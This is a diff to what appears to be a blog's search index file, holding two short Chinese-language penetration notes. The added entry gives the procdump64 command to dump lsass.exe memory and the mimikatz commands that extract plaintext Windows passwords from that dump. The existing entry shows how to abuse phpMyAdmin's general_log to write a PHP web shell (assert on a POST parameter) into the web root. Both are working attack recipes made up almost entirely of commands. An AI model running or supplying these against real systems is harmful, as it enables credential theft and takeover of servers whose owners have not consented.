@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[两步完成利用procdump64+mimikatz获取win用户密码]]></title>
+    <url>%2Farchives%2Ff86fa73d.html</url>
+    <content type="text"><![CDATA[两步完成利用procdump64+mimikatz获取win用户密码使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exeprocdump64.exe -accepteula -ma lsass.exe lsass.dmp (注:必须使用管理员权限) 2.执行mimikatzmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit(注:必须使用管理员权限) 成功获取明文密码原文:两步完成利用procdump64+mimikatz获取win用户密码]]></content>
+  </entry>
+  <entry>
     <title><![CDATA[Phpmyadmin getshell]]></title>
     <url>%2Farchives%2F694daf10.html</url>
     <content type="text"><![CDATA[查看是否有写文件权限show global variables like &apos;%secure%&apos;;查看日志文件存放路径及开启SHOW GLOBAL VARIABLES LIKE &apos;%general_log%&apos; set global general_log = ONgetshell 三大命令:set global general_log=&apos;on&apos;; SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; //绝对路径 SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;;]]></content>
